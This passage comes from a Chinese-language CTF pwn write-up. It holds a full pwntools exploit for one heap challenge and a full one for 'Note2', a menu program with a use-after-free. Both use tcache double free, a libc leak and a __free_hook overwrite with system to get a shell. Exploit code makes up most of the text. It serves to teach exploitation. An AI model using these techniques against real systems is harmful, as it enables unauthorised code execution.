    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"Your choice : "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="mi">9</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"Index: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span><span class="c1">#prev</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="s1">'b'</span><span class="p">)</span><span class="c1">#victim</span>

    <span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="s1">'c'</span><span class="p">)</span><span class="c1">#second tcache poisoning.after the first tcache poisoning,the 0x100 tcache chain will bad</span>
    <span class="c1">#so we need to prepare 0x80 tcache chain</span>
    <span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">*</span><span class="mi">14</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x180</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span><span class="c1">#size and prev_size of unsigned bin to be forged</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
        <span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">10</span><span class="p">):</span>
        <span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> 

    <span class="n">uaf</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

    <span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span><span class="c1">#take one from tcache bin</span>

    <span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="c1">#double free</span>

    <span class="n">add</span><span class="p">(</span><span class="mh">0x70</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span><span class="c1">#let the fd pointer of unsorted bin local tcache bin</span>

    <span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span>

    <span class="n">add</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span><span class="s1">'</span><span class="se">\xa0\x46</span><span class="s1">'</span><span class="p">)</span><span class="c1">#stdout struct</span>

    <span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">*</span><span class="mi">18</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x180</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span><span class="c1">#tamper size of unsorted bin</span>

    <span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1887</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span><span class="c1">#io leak</span>

    <span class="n">leak_libc</span><span class="o">=</span><span class="n">l64</span><span class="p">()</span>
    <span class="n">libc_base</span><span class="o">=</span><span class="n">leak_libc</span><span class="o">-</span><span class="mh">0x1ec980</span>
    <span class="n">li</span><span class="p">(</span><span class="s1">'libc_base = '</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>

    <span class="n">free_hook</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]</span>
    <span class="n">sys_addr</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'system'</span><span class="p">]</span>


    <span class="n">delete</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>

    <span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="c1">#second tcache poisoning</span>

    <span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x70</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0xb0</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span><span class="c1">#Cut a piece of memory from unsorted bin to control the fd pointer of tcache bin </span>


    <span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="s1">'/bin/sh</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span>

    <span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">))</span> 

    <span class="n">delete</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
     <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span> 
     <span class="n">libcso</span> <span class="o">=</span> <span class="s1">'./libc'</span>
     <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libcso</span><span class="p">)</span>
     <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
     <span class="n">pwn</span><span class="p">()</span>

    <span class="k">except</span><span class="p">:</span>
     <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231116163102-79fa2baa-845a-1.png"/></p>
<p>‍</p>
<h3 data-content="1" id="c36458707c2e5d3781376f84ac2b83cb">Note2</h3>
<h5 data-content="1" id="df2d078877dac87fadd4a5b1068d9563">静态分析：</h5>
<p>保护全开</p>
<div class="highlight"><pre><span></span><span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Full</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="p">:</span>    <span class="n">Canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="p">:</span>      <span class="n">PIE</span> <span class="n">enabled</span>
</pre></div>
<p>常规菜单题，没有edit功能</p>
<div class="highlight"><pre><span></span><span class="nb">int</span> <span class="n">__cdecl</span> <span class="n">__noreturn</span> <span class="n">main</span><span class="p">(</span><span class="nb">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="n">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">unsigned</span> <span class="n">__int64</span> <span class="n">number</span><span class="p">;</span> <span class="o">//</span> <span class="n">rax</span>

  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="il">0L</span><span class="n">L</span><span class="p">);</span>
  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="il">0L</span><span class="n">L</span><span class="p">);</span>
  <span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="il">0L</span><span class="n">L</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">print_menu</span><span class="p">();</span>
    <span class="n">number</span> <span class="o">=</span> <span class="n">get_number</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">number</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">puts</span><span class="p">(</span><span class="s2">"Bye!"</span><span class="p">);</span>
      <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">number</span> <span class="o">&lt;=</span> <span class="mi">4</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">switch</span> <span class="p">(</span> <span class="n">number</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">case</span> <span class="mi">3</span><span class="n">uLL</span><span class="p">:</span>
          <span class="n">op_view</span><span class="p">();</span>
          <span class="n">goto</span> <span class="n">LABEL_13</span><span class="p">;</span>
        <span class="n">case</span> <span class="mi">1</span><span class="n">uLL</span><span class="p">:</span>
          <span class="n">op_malloc</span><span class="p">();</span>
          <span class="n">goto</span> <span class="n">LABEL_13</span><span class="p">;</span>
        <span class="n">case</span> <span class="mi">2</span><span class="n">uLL</span><span class="p">:</span>
          <span class="n">op_free</span><span class="p">();</span>
          <span class="n">goto</span> <span class="n">LABEL_13</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">puts</span><span class="p">(</span><span class="s2">"Invalid choice!"</span><span class="p">);</span>
<span class="n">LABEL_13</span><span class="p">:</span>
    <span class="n">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div>
<p>在op_free函数中观察到很明显的UAF漏洞</p>
<div class="highlight"><pre><span></span><span class="n">void</span> <span class="n">op_free</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">__int64</span> <span class="n">index</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">8</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">8</span><span class="n">h</span><span class="p">]</span>

  <span class="n">puts</span><span class="p">(</span><span class="s2">"Index?"</span><span class="p">);</span>
  <span class="n">index</span> <span class="o">=</span> <span class="n">get_index</span><span class="p">();</span>
  <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">void</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">chonks</span> <span class="o">+</span> <span class="n">index</span><span class="p">));</span>
<span class="p">}</span>
</pre></div>
<p>和上一题的打法相似，依旧是围绕double free做文章</p>
<h5 data-content="1" id="b01e80cf6d9e7d616b4a404324dbf415">exp：</h5>
<div class="highlight"><pre><span></span><span class="c1"># encoding = utf-8</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">pwnlib.rop</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">pwnlib.context</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">pwnlib.fmtstr</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">pwnlib.util.packing</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">pwnlib.gdb</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">base64</span>

<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s1">'linux'</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">'amd64'</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">"debug"</span>

<span class="n">name</span> <span class="o">=</span> <span class="s1">'./pwn'</span>

<span class="n">debug</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">'127.0.0.1'</span><span class="p">,</span><span class="mi">8000</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>

<span class="n">libcso</span> <span class="o">=</span> <span class="s1">'./libc.so.6'</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libcso</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>


<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">,</span><span class="n">num</span>           <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">data</span><span class="p">)[</span><span class="o">-</span><span class="n">num</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">,</span><span class="n">num</span>           <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">data</span><span class="p">)[</span><span class="o">-</span><span class="n">num</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">leak</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">addr</span>          <span class="p">:</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'{} = {:#x}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">addr</span><span class="p">))</span>
<span class="n">l64</span>     <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\x7f</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
<span class="n">l32</span>     <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\xf7</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
<span class="n">li</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="k">print</span><span class="p">(</span><span class="s1">'</span><span class="se">\x1b</span><span class="s1">[01;38;5;214m'</span> <span class="o">+</span> <span class="n">x</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\x1b</span><span class="s1">[0m'</span><span class="p">)</span>
<span class="n">ll</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="k">print</span><span class="p">(</span><span class="s1">'</span><span class="se">\x1b</span><span class="s1">[01;38;5;1m'</span> <span class="o">+</span> <span class="n">x</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\x1b</span><span class="s1">[0m'</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'gnome-terminal'</span><span class="p">,</span><span class="s1">'-x'</span><span class="p">,</span><span class="s1">'sh'</span><span class="p">,</span><span class="s1">'-c'</span><span class="p">]</span>

<span class="n">add_idx</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">free_idx</span> <span class="o">=</span> <span class="mi">2</span>
<span class="n">show_idx</span> <span class="o">=</span> <span class="mi">3</span>

<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
   <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
   <span class="n">pause</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">choice</span><span class="p">(</span><span class="n">cho</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s1">'&gt; '</span><span class="p">,</span><span class="n">cho</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">con</span><span class="p">):</span>
    <span class="n">choice</span><span class="p">(</span><span class="n">add_idx</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s1">'Index?</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="n">idx</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s1">'Size?</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="n">size</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'content: '</span><span class="p">,</span><span class="n">con</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">choice</span><span class="p">(</span><span class="n">free_idx</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s1">'Index?</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="n">idx</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">choice</span><span class="p">(</span><span class="n">show_idx</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s1">'Index?</span><span class="se">\n</span><span class="s1">'</span><span class="p">,</span><span class="n">idx</span><span class="p">)</span>

<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="s1">'aaa'</span><span class="p">)</span> <span class="c1">#F</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="s1">'bbb'</span><span class="p">)</span> <span class="c1">#C</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">9</span><span class="p">):</span>
    <span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="s1">'eee'</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">9</span><span class="p">):</span>
    <span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">libc_base</span><span class="o">=</span><span class="n">l64</span><span class="p">()</span><span class="o">-</span><span class="mh">0x1ecbe0</span>
<span class="n">li</span><span class="p">(</span><span class="s1">'libc_base = '</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
<span class="n">free_hook</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x1eee48</span>
<span class="n">system</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x52290</span>

<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="s1">'tcache'</span><span class="p">)</span>
<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#double free</span>

<span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x70</span><span class="p">,</span><span class="s1">'111'</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="s1">'222'</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>

<span class="n">add</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="s1">'/bin/sh</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>

<span class="n">delete</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>


<span class="n">itr</span><span class="p">()</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231116163111-7fa25582-845a-1.png"/></p>
<p>成功getshell</p>
<p>‍</p>
<p>‍</p>
</div>
</div>